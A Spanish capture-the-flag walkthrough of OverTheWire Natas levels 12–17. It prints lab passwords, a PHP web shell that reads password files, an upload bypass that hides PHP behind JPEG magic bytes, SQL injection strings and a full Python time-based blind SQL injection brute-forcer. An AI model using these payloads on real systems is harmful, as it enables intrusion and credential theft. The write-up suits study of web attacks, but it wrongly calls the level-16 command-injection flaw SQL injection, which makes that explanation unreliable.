# Nivel 12-17

### NIVEL 12

Ingresamos las credenciales para el nivel 12.

* **Usuario:** `natas12`
* **Contraseña:** `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 12**. Se nos muestra que se puede subir archivos **JPEG** de máximo **1 KB** por lo que veremos el código fuente para más información.

<figure><img src="../../../.gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Al analizar el código, observamos que cuando subimos un archivo, se genera un nombre aleatorio para el archivo y se le asigna la extensión `.jpg`. Además, hay una restricción de tamaño: el archivo no puede superar los **1000 bytes (1 KB)**, por lo que no podemos subir cualquier imagen.

Sin embargo, dado que no existe una restricción sobre la extensión del archivo, podemos aprovechar esta situación para crear un archivo `shell.php` con el siguiente código:

```php
<?php
    $output = shell_exec('cat /etc/natas_webpass/natas13');
    echo "<pre>$output</pre>";
?>
```

Este script ejecutará el comando para leer el contenido del archivo `/etc/natas_webpass/natas13` y mostrará la salida en la página.

<figure><img src="../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

Al seleccionar el archivo para subir y abrir el inspector de elementos en **Chrome**, podemos observar que se genera automáticamente un nombre aleatorio para el archivo de imagen.

Para poder ejecutar nuestro archivo **PHP** posteriormente, podemos editar este campo en el formulario, reemplazando el nombre generado con `shell.php` como el nombre del archivo que se subirá.

Al hacer clic en el botón **"Upload file"** en el formulario, seremos dirigidos a una página donde se generará automáticamente un nuevo nombre aleatorio para el archivo subido.

> **Nota:** A pesar de que el nombre del archivo es aleatorio, la extensión que especificamos manualmente en el formulario anterior se conserva.

Este comportamiento nos permite ejecutar nuestro archivo personalizado en el servidor manteniendo la extensión que hemos elegido.

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-18 213936.png" alt=""><figcaption></figcaption></figure>

Al hacer clic en el enlace del archivo subido, se ejecutará nuestro código **PHP**. Este código ha sido diseñado específicamente para mostrar el contenido del archivo crítico en el sistema:

```plaintext
/etc/natas_webpass/natas13
```

Como resultado, podremos visualizar la contraseña necesaria para acceder al siguiente nivel.

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-18 213927.png" alt=""><figcaption></figcaption></figure>

#### NIVEL 13

Ingresamos las credenciales para el nivel 13:

* **Usuario:** `natas13`
* **Contraseña:** `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 13**. Se nos muestra como el nivel anterior pero con una diferencia en la que por razones de seguridad solo aceptan imágenes por lo que veremos el código fuente para más información.

<figure><img src="../../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

En este nivel, se ha implementado el uso de la función `exif_imagetype` de PHP, la cual verifica si el archivo seleccionado es una imagen válida.

Similar al reto anterior, podemos crear un archivo llamado `payload.jpg` que contenga el siguiente código para visualizar el contenido del archivo `/etc/natas_webpass/natas14`. Sin embargo, en esta ocasión, es necesario que utilicemos la extensión `.jpg` para que sea reconocido como una imagen.

```php
<?php
    $output = shell_exec('cat /etc/natas_webpass/natas14');
    echo "<pre>$output</pre>";
?>
```

Este archivo nos permitirá superar la verificación y acceder a la información deseada.

Sin embargo, si intentamos subir este archivo tal como está, el sistema detectará que no es una imagen válida. Esto se debe a que no solo se verifica la extensión del archivo, sino también la firma que corresponde al formato JPG.

Podemos solucionar esto utilizando el editor hexadecimal `hexeditor`:

1.  Abre el archivo `payload.jpg` en `hexeditor`:

    ```bash
    hexeditor -b payload.jpg
    ```
2. Inserta bytes nulos presionando cuatro veces `Ctrl + A`.
3. Luego, sustituye estos bytes nulos por la firma de un archivo JPG, como `FF D8 FF DB`.
4. Finalmente, guarda los cambios y sal del editor presionando `Ctrl + X`.

De esta manera, el archivo pasará la validación de imagen y podremos continuar con la explotación.

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-19 170010.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-19 170040.png" alt=""><figcaption></figcaption></figure>

> **Nota:** Como alternativa, puedes utilizar una imagen válida de menos de 1 KB e inyectar al final de esta el código PHP mencionado anteriormente. Esto permitirá que la imagen pase las verificaciones necesarias, mientras que el código PHP adicional se ejecutará al procesar el archivo, mostrando el contenido de `/etc/natas_webpass/natas14`.

Después de realizar estos cambios, selecciona este archivo para subirlo. Antes de enviarlo, edita el nombre del archivo en el campo del formulario de carga y cambia su extensión a `.php`.

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-19 170542.png" alt=""><figcaption></figcaption></figure>

A continuación, aparecerá un enlace a un archivo con un nombre aleatorio y la extensión `.php`. Solo necesitas acceder a este enlace para ejecutar el código PHP que hemos ocultado dentro de la imagen JPG.

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-19 173715.png" alt=""><figcaption></figcaption></figure>

Al acceder al enlace, podrás ver la contraseña para avanzar al siguiente nivel. Además, aparecerán cuatro caracteres binarios adicionales que habíamos insertado previamente con el editor hexadecimal.

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-19 173705.png" alt=""><figcaption></figcaption></figure>

## NIVEL 14

Ingresamos las credenciales para el nivel 14:

**Usuario:** `natas14`\
**Contraseña:** `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 14**. Se nos muestra en la página para hacer **Login** con nuestro usuario y contraseña por lo que veremos el código de fuente para más información.&#x20;

<figure><img src="../../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

Al analizar el código, notamos que la consulta **SQL** para verificar las credenciales de usuario y contraseña está escrita en una sola línea y no incluye medidas de seguridad. Esto permite realizar un ataque de **inyección SQL**.

Para explotar esta vulnerabilidad, ingresa las cadenas `" OR "1"="1` tanto en el campo de usuario como en el de contraseña. Al hacer clic en el botón de inicio de sesión, podrás acceder a la contraseña para el siguiente nivel.

<figure><img src="../../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

## NIVEL 15

Ingresamos las credenciales para el nivel 15:

**Usuario:** `natas15`\
**Contraseña:** `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 15**.  Se nos muestra como una comprobación si existe el usuario que ingresamos en la base de datos por lo que veremos el código de fuente para más información.&#x20;

<figure><img src="../../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

Al analizar el código, vemos que se muestra cómo se ha creado la tabla `users` (dentro de comentarios), que incluye los campos `username` y `password`.

Más abajo, encontramos la consulta SQL utilizada para verificar si el usuario existe. También se observa que la URL debe recibir un parámetro GET llamado `debug`, es decir, `$_GET["debug"]` debe estar presente.

Para resolver este desafío, podemos explotar una vulnerabilidad en la consulta SQL que nos permitirá realizar un **ataque de fuerza bruta**.

Para facilitar este proceso, el equipo de Init0 (ciberseguridad) ha desarrollado un script en PHP, que puedes encontrar en el siguiente enlace:

[Script PHP para fuerza bruta](https://github.com/oddworldng/natas15-php-overthewire)

Al examinar el código del script, podemos identificar dos fases distintas:

1. **Filtrado de Caracteres**: La primera fase utiliza una lista de caracteres disponibles (`a-zA-Z0-9`) para realizar una consulta SQL con el operador `LIKE` y la función `BINARY`. Este proceso permite verificar qué caracteres son parte de la contraseña y cuáles no, optimizando así la búsqueda de la contraseña final.
2. **Ataque de Fuerza Bruta**: En la segunda fase, el script utiliza los caracteres identificados en la fase anterior para llevar a cabo un ataque de fuerza bruta. Se sigue la misma metodología de filtrado para encontrar la contraseña completa.

Para ejecutar este script y obtener la contraseña del siguiente nivel, simplemente usa el siguiente comando:

```bash
php natas15.php
```

<figure><img src="../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

## NIVEL 16

Ingresamos las credenciales para el nivel 16:

**Usuario:** `natas16`\
**Contraseña:**`hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 16**.  Nos aparece un buscador de palabras pero filtrando ciertos caracteres por razones de seguridad que tengamos en nuestra entrada por lo que miramos el código fuente para más información.

<figure><img src="../../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

Al analizar el código, observamos lo siguiente:

1. **Caracteres Bloqueados**: Se han definido ciertos caracteres que no pueden ser utilizados.
2. **Búsqueda en dictionary.txt**: Se realiza una búsqueda en este archivo usando la función `passthru` de PHP.
3. **Clave en la URL**: La URL debe contener la clave `needle`.

Para llevar a cabo un ataque, en este caso, se trata de una **inyección SQL a ciegas** (Blind SQL Injection), similar al ejemplo anterior.

El objetivo es responder a la pregunta: **¿Contiene la contraseña almacenada en `/etc/natas_webpass/natas17` la letra 'a'?**

Dado que el sistema muestra datos cuando la subcadena existe y devuelve un contenido vacío cuando no, podemos utilizar este comportamiento para nuestra explotación.

El equipo de Init0 (ciberseguridad) ha desarrollado un script en PHP para facilitar este proceso. Puedes encontrar el script en el siguiente enlace: [natas16-php-overthewire](https://github.com/oddworldng/natas16-php-overthewire).

Al analizar el código del script, podemos identificar dos fases principales:

1. **Filtrado de Caracteres**: La primera fase utiliza una lista completa de caracteres (`a-zA-Z0-9`) y realiza consultas CURL GET a la URL del reto. Esta etapa verifica qué caracteres son parte de la contraseña y cuáles no, optimizando así la búsqueda de la contraseña final.
2. **Ataque de Fuerza Bruta**: En la segunda fase, el script usa los caracteres identificados en la fase anterior para llevar a cabo un ataque de fuerza bruta. Se sigue el mismo enfoque de filtrado para construir la contraseña completa.

Para ejecutar el script y descubrir la contraseña para el siguiente nivel, usa el siguiente comando:

```bash
php natas16.php
```

<figure><img src="../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

## NIVEL 17

Ingresamos las credenciales para el nivel 17:

**Usuario:** `natas17`\
**Contraseña:** `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 17**. Se nos muestra como una comprobación si existe el usuario que ingresamos en la base de datos por lo que veremos el código de fuente para más información.&#x20;

<figure><img src="../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

Este nivel es de tipo **inyección SQL ciega basada en tiempo**, como se puede deducir del código fuente. Por lo tanto, intentemos realizar un ataque de fuerza bruta en este nivel, similar a los otros niveles de SQL. A continuación, se presenta el script guardado como archivo `.py` para llevar a cabo el ataque de fuerza bruta en la terminal usando Python.

```python
import requests
import re
from time import *

# Caracteres posibles para la contraseña
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Credenciales de acceso
username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"

# URL del objetivo
Url = "http://natas17.natas.labs.overthewire.org"

# Crear una sesión de requests
session = requests.session()

# Lista para almacenar la contraseña encontrada
current_password = list()

while True:
    for character in characters:
        # Imprimir el progreso actual
        print("Trying with: " + "".join(current_password) + character)
        
        # Medir el tiempo de respuesta
        startTime = time()
        
        # Realizar la solicitud POST con inyección SQL
        response = session.post(
            Url, 
            data={"username": 'natas18" AND password LIKE BINARY "' + "".join(current_password) + character + '%" AND SLEEP(2) #'},
            auth=(username, password)
        )
        
        # Calcular el tiempo transcurrido
        endTime = time()
        
        # Si el tiempo transcurrido es mayor a 2 segundos, el carácter es correcto
        if endTime - startTime > 2:
            current_password.append(character)
            break
    
    # Salir del bucle si la contraseña tiene 32 caracteres
    if len(current_password) == 32:
        break

# Imprimir la contraseña encontrada
print("Password found: " + "".join(current_password))
```

<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>



